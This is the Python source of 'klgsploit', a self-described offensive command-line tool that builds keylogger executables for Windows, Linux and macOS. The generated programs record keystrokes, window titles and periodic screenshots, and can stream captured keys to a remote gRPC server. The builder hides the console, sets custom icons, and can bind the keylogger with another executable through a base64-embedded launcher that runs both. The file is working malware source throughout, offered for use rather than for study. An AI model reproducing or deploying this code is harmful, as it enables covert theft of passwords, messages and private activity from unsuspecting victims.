"""
structring the assembled code :
This module serves as the main entry point for the assembled application.
main functionalities
cli offensive tool with multi attack functionalities
ability to generate an executable with specified functions
options are
keyloggin into -o output file
-t key logging with time stamp
-m key logging with window title
-s screenshot capture at intervals -i interval in seconds -so output folder
-win || -lnx || -mac specify OS
--genexe generate executable with specified options
--merge exe1 exe2 merge two executables into one
--grpc start grpc server to output keylogs into

example usage:
klgsploit.py -o output.log -so output_folder -t -s 60 --genexe -lnx keylogger.exe
klgsploit.py --genexe -lnx mylogger
klgsploit.py --genexe -win mylogger.exe
klgsploit.py --run  (run keylogger directly)
"""
import sys
import os
import argparse
import subprocess
import tempfile
import shutil

# Detect or parse OS argument early (before argparse consumes it)
os_arg = None
for i, arg in enumerate(sys.argv):
    if arg in ['-win', '-lnx', '-mac']:
        os_arg = arg
        break
if os_arg:
    sys.argv.pop(i)
    target_os = os_arg[1:]  # remove leading '-'
else:
    if sys.platform.lower().startswith('win'):
        target_os = 'win'
    elif sys.platform.lower().startswith('linux'):
        target_os = 'lnx'
    elif sys.platform.lower().startswith('darwin'):
        target_os = 'mac'
    else:
        target_os = 'lnx'  # default fallback

# --- Argument Parser ---
def parse_args():
    parser = argparse.ArgumentParser(
        prog='klgsploit',
        description='CLI offensive tool with keylogging and executable generation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --run                          Run keylogger directly
  %(prog)s --genexe mylogger              Generate executable for current OS
  %(prog)s --genexe mylogger -win         Generate Windows executable
  %(prog)s --genexe mylogger -lnx         Generate Linux executable
  %(prog)s -o keylog.txt -t --run         Run with output file and timestamps
  %(prog)s --grpc 192.168.1.100:50051     Run with gRPC remote logging
        """
    )
    
    # Keylogger options
    parser.add_argument('-o', '--output', type=str, default='keylog.txt',
                        help='Output file for keylogs (default: keylog.txt)')
    parser.add_argument('-t', '--timestamp', action='store_true',
                        help='Enable timestamps in keylog')
    parser.add_argument('-m', '--window-title', action='store_true',
                        help='Log active window title')
    
    # Screenshot options
    parser.add_argument('-s', '--screenshot', action='store_true',
                        help='Enable screenshot capture')
    parser.add_argument('-i', '--interval', type=int, default=60,
                        help='Screenshot interval in seconds (default: 60)')
    parser.add_argument('-so', '--screenshot-output', type=str, default='screenshots',
                        help='Screenshot output folder (default: screenshots)')
    
    # Executable generation
    parser.add_argument('--genexe', type=str, metavar='NAME',
                        help='Generate executable with specified name')
    parser.add_argument('--onefile', action='store_true', default=True,
                        help='Generate single-file executable (default: True)')
    parser.add_argument('--noconsole', action='store_true', default=True,
                        help='Hide console window (default: True)')
    parser.add_argument('--icon', type=str, metavar='ICON_PATH',
                        help='Icon file for executable (.ico for Windows, .icns for Mac)')
    
    # Merge executables
    parser.add_argument('--merge', nargs=2, metavar=('EXE1', 'EXE2'),
                        help='Merge two executables into one')
    
    # gRPC options
    parser.add_argument('--grpc', type=str, metavar='HOST:PORT',
                        help='gRPC server address for remote logging')
    
    # Run mode
    parser.add_argument('--run', action='store_true',
                        help='Run keylogger directly')
    
    return parser.parse_args()

# --- Configuration class to pass options to keylogger ---
class KeylogConfig:
    output_file = 'keylog.txt'
    timestamp_enabled = True
    window_title_enabled = True
    screenshot_enabled = False
    screenshot_interval = 60
    screenshot_folder = 'screenshots'
    grpc_server = None

config = KeylogConfig()

# --- Template for generated executable ---
def generate_keylogger_script(config, target_os):
    """Generate a standalone keylogger script based on configuration."""
    
    grpc_import = ""
    grpc_init = ""
    grpc_send = ""
    
    if config.grpc_server:
        grpc_import = """
import grpc
import threading
from protos import server_pb2, server_pb2_grpc

grpc_channel = None
grpc_stub = None
"""
        grpc_init = f"""
def init_grpc():
    global grpc_channel, grpc_stub
    try:
        grpc_channel = grpc.insecure_channel('{config.grpc_server}')
        grpc_stub = server_pb2_grpc.KeylogServiceStub(grpc_channel)
    except Exception as e:
        print(f"gRPC init failed: {{e}}")

init_grpc()
"""
        grpc_send = """
def send_to_grpc(message):
    global grpc_stub
    if grpc_stub:
        try:
            def _send():
                grpc_stub.SendKeylog(server_pb2.KeylogRequest(message=message))
            threading.Thread(target=_send, daemon=True).start()
        except Exception:
            pass
"""
    
    screenshot_code = ""
    if config.screenshot_enabled:
        screenshot_code = f"""
import threading
import time
from PIL import ImageGrab
import os

SCREENSHOT_FOLDER = '{config.screenshot_folder}'
SCREENSHOT_INTERVAL = {config.screenshot_interval}

def screenshot_thread():
    os.makedirs(SCREENSHOT_FOLDER, exist_ok=True)
    while True:
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(SCREENSHOT_FOLDER, f"screenshot_{{timestamp}}.png")
            screenshot = ImageGrab.grab()
            screenshot.save(filepath)
        except Exception as e:
            pass
        time.sleep(SCREENSHOT_INTERVAL)

# Start screenshot thread
threading.Thread(target=screenshot_thread, daemon=True).start()
"""

    if target_os == 'win':
        platform_imports = """
try:
    import pygetwindow as gw
except ImportError:
    gw = None
"""
        get_window_func = """
def get_active_window_title():
    try:
        if gw is None:
            return "Unknown"
        active_window = gw.getActiveWindow()
        if active_window is None:
            return "Desktop"
        title = active_window.title
        if title in ("Program Manager", ""):
            return "Desktop"
        return title
    except Exception:
        return "Desktop"
"""
    else:  # Linux/Mac
        platform_imports = """
import subprocess
"""
        get_window_func = """
def get_active_window_title():
    try:
        result = subprocess.run(
            ['xdotool', 'getactivewindow', 'getwindowname'],
            capture_output=True, text=True, timeout=1
        )
        if result.returncode == 0:
            return result.stdout.strip() or "Desktop"
        return "Desktop"
    except Exception:
        return "Desktop"
"""

    timestamp_code = 'datetime.now().strftime("%Y-%m-%d %H:%M:%S")' if config.timestamp_enabled else '""'
    window_log = 'get_active_window_title()' if config.window_title_enabled else '""'

    script = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Auto-generated keylogger executable"""

from pynput import keyboard
from datetime import datetime
import os
{platform_imports}
{grpc_import}

OUTPUT_FILE = '{config.output_file}'
TIMESTAMP_ENABLED = {config.timestamp_enabled}
WINDOW_TITLE_ENABLED = {config.window_title_enabled}

last_window_title = ""
{grpc_init}
{grpc_send}
{get_window_func}
{screenshot_code}

def on_press(key):
    global last_window_title
    timestamp = {timestamp_code}
    current_window = {window_log} if WINDOW_TITLE_ENABLED else ""
    
    try:
        with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
            if WINDOW_TITLE_ENABLED and current_window != last_window_title:
                f.write(f'\\n--- Window: [{{current_window}}] at {{timestamp}} ---\\n')
                last_window_title = current_window
            
            if hasattr(key, 'char') and key.char:
                log_line = f'[{{timestamp}}] Key: {{key.char}}\\n' if TIMESTAMP_ENABLED else f'{{key.char}}'
                f.write(log_line)
                {"send_to_grpc(log_line)" if config.grpc_server else ""}
            else:
                key_name = str(key).replace('Key.', '')
                log_line = f'[{{timestamp}}] Special: {{key_name}}\\n' if TIMESTAMP_ENABLED else f'[{{key_name}}]'
                f.write(log_line)
                {"send_to_grpc(log_line)" if config.grpc_server else ""}
    except Exception as e:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def main():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
'''
    return script


def generate_executable(name, config, target_os):
    """Generate executable using PyInstaller."""
    
    # Create temp directory for build
    build_dir = tempfile.mkdtemp(prefix='klgsploit_build_')
    script_path = os.path.join(build_dir, 'keylogger_generated.py')
    
    try:
        # Generate the script
        script_content = generate_keylogger_script(config, target_os)
        with open(script_path, 'w', encoding='utf-8') as f:
            f.write(script_content)
        
        print(f"[*] Generated script at: {script_path}")
        print(f"[*] Target OS: {target_os}")
        print(f"[*] Building executable: {name}")
        
        # Determine output extension
        if target_os == 'win' and not name.endswith('.exe'):
            output_name = name + '.exe'
        else:
            output_name = name
        
        # Build PyInstaller command
        pyinstaller_cmd = [
            sys.executable, '-m', 'PyInstaller',
            '--name', os.path.splitext(os.path.basename(output_name))[0],
            '--distpath', os.getcwd(),
            '--workpath', os.path.join(build_dir, 'build'),
            '--specpath', build_dir,
            '--clean',
            '--noconfirm',
        ]
        
        # Add options
        if config.onefile:
            pyinstaller_cmd.append('--onefile')
        if config.noconsole:
            pyinstaller_cmd.append('--noconsole')
        if hasattr(config, 'icon') and config.icon:
            pyinstaller_cmd.extend(['--icon', config.icon])
        
        # Hidden imports for pynput
        pyinstaller_cmd.extend(['--hidden-import', 'pynput.keyboard._xorg'])
        pyinstaller_cmd.extend(['--hidden-import', 'pynput.keyboard._win32'])
        pyinstaller_cmd.extend(['--hidden-import', 'pynput.keyboard._darwin'])
        pyinstaller_cmd.extend(['--hidden-import', 'pynput.mouse._xorg'])
        pyinstaller_cmd.extend(['--hidden-import', 'pynput.mouse._win32'])
        pyinstaller_cmd.extend(['--hidden-import', 'pynput.mouse._darwin'])
        
        if target_os == 'win':
            pyinstaller_cmd.extend(['--hidden-import', 'pygetwindow'])
        
        if config.grpc_server:
            pyinstaller_cmd.extend(['--hidden-import', 'grpc'])
        
        pyinstaller_cmd.append(script_path)
        
        print(f"[*] Running: {' '.join(pyinstaller_cmd)}")
        
        # Run PyInstaller
        result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"[+] Successfully generated executable: {output_name}")
            print(f"[+] Location: {os.path.join(os.getcwd(), output_name)}")
            return True
        else:
            print(f"[-] PyInstaller failed:")
            print(result.stderr)
            return False
            
    except FileNotFoundError:
        print("[-] PyInstaller not found. Install with: pip install pyinstaller")
        return False
    except Exception as e:
        print(f"[-] Error generating executable: {e}")
        return False
    finally:
        # Cleanup temp directory
        try:
            shutil.rmtree(build_dir)
        except Exception:
            pass


def merge_executables(exe1, exe2, output_name="merged_exe"):
    """Merge two executables (basic stub - platform specific implementation needed)."""
    print(f"[*] Merging {exe1} and {exe2} into {output_name}")
    
    if not os.path.exists(exe1):
        print(f"[-] File not found: {exe1}")
        return False
    if not os.path.exists(exe2):
        print(f"[-] File not found: {exe2}")
        return False
    
    # Create a launcher script that runs both
    launcher_script = f'''#!/usr/bin/env python3
import subprocess
import sys
import os
import tempfile
import base64

# Embedded executables (base64 encoded)
EXE1_DATA = """{base64.b64encode(open(exe1, 'rb').read()).decode()}"""
EXE2_DATA = """{base64.b64encode(open(exe2, 'rb').read()).decode()}"""

def main():
    tmp_dir = tempfile.mkdtemp()
    exe1_path = os.path.join(tmp_dir, "exe1")
    exe2_path = os.path.join(tmp_dir, "exe2")
    
    with open(exe1_path, 'wb') as f:
        f.write(base64.b64decode(EXE1_DATA))
    with open(exe2_path, 'wb') as f:
        f.write(base64.b64decode(EXE2_DATA))
    
    os.chmod(exe1_path, 0o755)
    os.chmod(exe2_path, 0o755)
    
    subprocess.Popen([exe1_path])
    subprocess.Popen([exe2_path])

if __name__ == "__main__":
    main()
'''
    
    merged_script_path = f"{output_name}_launcher.py"
    with open(merged_script_path, 'w') as f:
        f.write(launcher_script)
    
    print(f"[+] Created merged launcher: {merged_script_path}")
    print(f"[*] To create final executable, run: python -m PyInstaller --onefile {merged_script_path}")
    return True


# --- Keylogger function wrapper ---
def funcRedef(func):
    def wrapper(*args, **kwargs):
        return func(*args, **kwargs)
    return wrapper

def keyloggerThread():
    return

# Import OS-specific keylogger module
if target_os == 'win':
    try:
        from keylogwin import *
        @funcRedef
        def keyloggerThread():
            loggerFunction()
    except ImportError as e:
        print(f"[-] Cannot import keylogwin: {e}")

elif target_os in ('lnx', 'mac'):
    try:
        from keylogtest import *
        @funcRedef
        def keyloggerThread():
            loggerFunction()
    except ImportError as e:
        print(f"[-] Cannot import keylogtest: {e}")


# --- Main ---
def main():
    args = parse_args()
    
    # Update config from args
    config.output_file = args.output
    config.timestamp_enabled = args.timestamp
    config.window_title_enabled = args.window_title
    config.screenshot_enabled = args.screenshot
    config.screenshot_interval = args.interval
    config.screenshot_folder = args.screenshot_output
    config.grpc_server = args.grpc
    config.onefile = args.onefile
    config.noconsole = args.noconsole
    if args.icon:
        config.icon = args.icon
    
    print(f"[*] Target OS: {target_os}")
    
    # Handle --genexe
    if args.genexe:
        generate_executable(args.genexe, config, target_os)
        return
    
    # Handle --merge
    if args.merge:
        merge_executables(args.merge[0], args.merge[1])
        return
    
    # Handle --run or default behavior
    if args.run or (not args.genexe and not args.merge):
        print("[*] Starting keylogger...")
        print(f"[*] Output: {config.output_file}")
        print(f"[*] Timestamps: {config.timestamp_enabled}")
        print(f"[*] Window titles: {config.window_title_enabled}")
        if config.grpc_server:
            print(f"[*] gRPC server: {config.grpc_server}")
        print("[*] Press ESC to stop")
        keyloggerThread()


if __name__ == "__main__":
    main()
